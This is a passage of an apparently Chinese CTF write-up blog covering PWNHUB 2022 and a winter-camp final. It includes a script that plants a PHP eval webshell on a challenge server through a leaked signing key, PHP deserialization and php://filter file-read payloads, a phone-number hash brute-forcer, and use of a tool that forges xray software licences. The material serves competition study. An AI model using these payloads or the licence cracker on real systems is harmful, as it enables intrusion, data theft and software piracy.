src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第2届山石CTF冬令营结营赛wp</title>
    <link href="/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/"/>
    <url>/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.jpg"></p><h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>highlight_file(__FILE__);<br>//hint.php<br>foreach ($_GET <span class="hljs-keyword">as</span> $value) &#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$value))&#123;<br>        die(<span class="hljs-string">&quot;不可以看flag啦，阿sir&quot;</span>);<br>    &#125;<br><br>&#125;<br>$a = new $_GET[<span class="hljs-string">&#x27;class1&#x27;</span>]($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);$b = new $_GET[<span class="hljs-string">&#x27;class2&#x27;</span>]($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-keyword">if</span> ($a !== $b <span class="hljs-keyword">and</span> md5($a)===md5($b))<br>&#123;<br>    echo new $_GET[<span class="hljs-string">&#x27;class3&#x27;</span>]($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>原生类绕过：参考：<a href="https://blog.csdn.net/qq_63928796/article/details/127786521">https://blog.csdn.net/qq_63928796/article/details/127786521</a><br><code>?class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>filter流伪协议读到源码<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>echo <span class="hljs-string">&quot;no hint&quot;</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    function <span class="hljs-built_in">eval</span>() &#123;<br>        echo new $this-&gt;b1($this-&gt;b2);<br>    &#125;<br><br>    public function __invoke()<br>    &#123;<br>        $this-&gt;b1-&gt;blue();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __destruct()<br>    &#123;<br>        echo $this-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>;<br>    &#125;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;r1)();<br>    &#125;<br><br>    public function __call($a, $b)<br>    &#123;<br>        echo $this-&gt;r1-&gt;getFlag();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __toString()<br>    &#123;<br>        $this-&gt;w-&gt;execute();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;c1)();<br>    &#125;<br><br>    public function getFlag()<br>    &#123;<br>        echo file_get_contents($this-&gt;c1);<br>    &#125;<br><br>&#125;<br><br>unserialize($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>反序列化构造payload<br>参考：<br><a href="https://blog.csdn.net/cosmoslin/article/details/123829951">https://blog.csdn.net/cosmoslin/article/details/123829951</a><br>构造伪协议读取flag<code>php://filter/convert.base64-encode/resource=flag.php</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    public function __construct($b1)<br>    &#123;<br>        $this-&gt;b1 = $b1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __construct($r1)<br>    &#123;<br>        $this-&gt;r1 = $r1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __construct($w)<br>    &#123;<br>        $this-&gt;w = $w;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function __construct($c1)<br>    &#123;<br>        $this-&gt;c1 = $c1;<br>    &#125;<br><br>&#125;<br>$f = new color(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br>$e = new red($f);<br>$d = new blue($e);<br>$c = new color($d);<br>$b = new white($c);<br>$a = new red($b);<br>echo (urlencode(serialize($a)));<br></code></pre></td></tr></table></figure><p><img 